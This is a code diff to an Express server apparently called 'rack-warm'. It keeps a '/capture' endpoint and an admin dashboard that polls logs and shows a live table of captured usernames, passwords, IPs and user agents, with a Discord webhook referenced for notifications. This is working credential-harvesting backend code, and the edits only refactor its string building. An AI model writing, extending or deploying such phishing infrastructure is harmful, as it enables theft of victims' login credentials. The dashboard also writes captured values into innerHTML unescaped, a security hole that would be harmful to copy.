@@ -85,7 +85,7 @@ app.post('/capture', (req, res) => {
 
 app.get('/admin', (req, res) => {
   if (!isAdmin(req)) return res.status(403).send('nope');
-  res.send(`<!doctype html><html><head><meta charset="utf-8">
+  const adminHtml = `<!doctype html><html><head><meta charset="utf-8">
 <title>rack · live</title>
 <style>
   body{margin:0;background:#0f1115;color:#e6e6e6;font-family:monospace;padding:20px}
@@ -104,15 +104,16 @@ async function tick(){
   const t = await r.text();
   const rows = t.trim().split('\\n').filter(Boolean).map(l=>{
     try{ const m = l.match(/\\[([^\\]]+)\\] (\\{.*\\})/); const d = JSON.parse(m[2]);
-      return `<tr><td>${new Date(d.ts).toLocaleTimeString()}</td><td class="user">${d.user||''}</td><td class="pass">${d.pass||''}</td><td>${d.ip||''}</td><td style="color:#8a8f99">${(d.ua||'').slice(0,60)}</td></tr>`;
+      return '<tr><td>' + new Date(d.ts).toLocaleTimeString() + '</td><td class="user">' + (d.user||'') + '</td><td class="pass">' + (d.pass||'') + '</td><td>' + (d.ip||'') + '</td><td style="color:#8a8f99">' + (d.ua||'').slice(0,60) + '</td></tr>';
     }catch(e){return ''}
   }).reverse().join('');
   document.getElementById('wrap').innerHTML = rows
-    ? `<table><tr><th>time</th><th>user</th><th>pass</th><th>ip</th><th>ua</th></tr>${rows}</table>`
+    ? '<table><tr><th>time</th><th>user</th><th>pass</th><th>ip</th><th>ua</th></tr>' + rows + '</table>'
     : '<div class="empty">no captures yet — waiting</div>';
 }
 tick(); setInterval(tick, 3000);
-</script></body></html>`);
+</script></body></html>`;
+  res.send(adminHtml);
 });
 
 app.get('/admin/logs', (req, res) => {
@@ -121,4 +122,4 @@ app.get('/admin/logs', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`rack-warm on :${PORT} · discord=${!!DISCORD_WEBHOOK} · admin=${ADMIN_USER}`));
+app.listen(PORT, () => console.log('rack-warm on :' + PORT));
